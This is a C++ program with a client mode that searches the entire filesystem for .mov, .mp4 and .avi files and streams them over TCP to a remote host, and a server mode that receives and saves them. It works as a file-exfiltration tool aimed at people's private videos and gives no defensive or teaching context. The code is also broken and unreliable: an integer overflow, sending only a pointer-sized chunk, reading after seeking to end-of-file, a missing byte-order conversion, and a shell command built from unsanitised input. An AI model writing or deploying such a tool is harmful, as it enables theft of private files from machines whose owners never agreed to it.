#include <bits/stdc++.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
using namespace std;
const int INF=((1*1024*1024*1024)*8);
int c_fd;
void close_connect(int sign){
    close(c_fd);
    cerr<<"The Signal We get :"<<sign;
    exit(0);
}
vector<string> find_file(string filename){
    vector<string> files(16384);
    system(("find / -name \" "+filename+"\" > file.list").c_str());
    ifstream file_list("file.list");
    string i;
    int length=0;
    while(file_list>>i) files[length++]=i;
    return files;
}
void server(char* host,int port){
    int s_fd,s_len,c_len,Count=0;
    sockaddr_in s_addr,c_addr;
    s_fd=socket(AF_INET,SOCK_STREAM,0);
    s_addr.sin_family=AF_INET;
    s_addr.sin_addr.s_addr=inet_addr(host);
    s_addr.sin_port=port;
    s_len=sizeof(s_addr);
    bind(s_fd,(sockaddr*)&s_addr,s_len);
    listen(s_fd,10);
    while(true){
        c_len=sizeof(c_addr);
        c_fd=accept(s_fd,(sockaddr*)&c_addr,(socklen_t *__restrict)&c_len);
        char* buf=new char[INF];
        recv(c_fd,buf,sizeof(buf),0);
        char filename[256];
        sprintf(filename,"file%d",Count++);
        ofstream ofile;
        ofile.open(filename,ios::binary);
        ofile.write(buf,sizeof(buf));
        ofile.close();
    }
}
void client(char* host,int port){
    int sockfd;
    sockaddr_in addr;
    sockfd=socket(AF_INET,SOCK_STREAM,0);
    addr.sin_family=AF_INET;
    addr.sin_addr.s_addr=inet_addr(host);
    addr.sin_port=port;
    int len=sizeof(addr);
    int newsockfd=connect(sockfd,(sockaddr*)&addr,len);
    char* buf=new char[INF];
    ifstream ifile;
    for(auto i : find_file("*.mov")){
        ifile.open(i,ios::binary);
        ifile.seekg(0,ios::end);
        ifile.read(buf,ifile.tellg());
        send(sockfd,buf,sizeof(buf),0);
    }
    for (auto i : find_file("*.mp4")) {
        ifile.open(i, ios::binary);
        ifile.seekg(0, ios::end);
        ifile.read(buf,ifile.tellg());
        send(sockfd, buf, sizeof(buf), 0);
    }
    for (auto i : find_file("*.avi")) {
        ifile.open(i, ios::binary);
        ifile.seekg(0, ios::end);
        ifile.read(buf,ifile.tellg());
        send(sockfd, buf, sizeof(buf), 0);
    }
    close(sockfd);
}
int main(int argc,char** argv){
    if(argc!=4) return 127;
    if(!strcmp(argv[1],"server"))
        server(argv[2],atoi(argv[3]));
    else
        client(argv[2],atoi(argv[3]));
}
